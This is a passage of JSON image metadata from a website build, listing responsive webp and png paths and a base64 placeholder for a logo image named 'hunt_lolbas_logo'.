749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/0acdf/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/ac59e/hunt_lolbas_logo.webp 163w,\n/static/e6f5e62a79cd7704687fe00638df8551/7660b/hunt_lolbas_logo.webp 327w,\n/static/e6f5e62a79cd7704687fe00638df8551/0acdf/hunt_lolbas_logo.webp 653w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/502b1/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/f2e6d/hunt_lolbas_logo.png 114w,\n/static/e6f5e62a79cd7704687fe00638df8551/4ddba/hunt_lolbas_logo.png 229w,\n/static/e6f5e62a79cd7704687fe00638df8551/502b1/hunt_lolbas_logo.png 457w,\n/static/e6f5e62a79cd7704687fe00638df8551/7ddc2/hunt_lolbas_logo.png 686w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/15384/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/31fce/hunt_lolbas_logo.webp 114w,\n/static/e6f5e62a79cd7704687fe00638df8551/e3e25/hunt_lolbas_logo.webp 229w,\n/static/e6f5e62a79cd7704687fe00638df8551/15384/hunt_lolbas_logo.webp 457w,\n/static/e6f5e62a79cd7704687fe00638df8551/0258d/hunt_lolbas_logo.webp 686w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png"}}}]}}}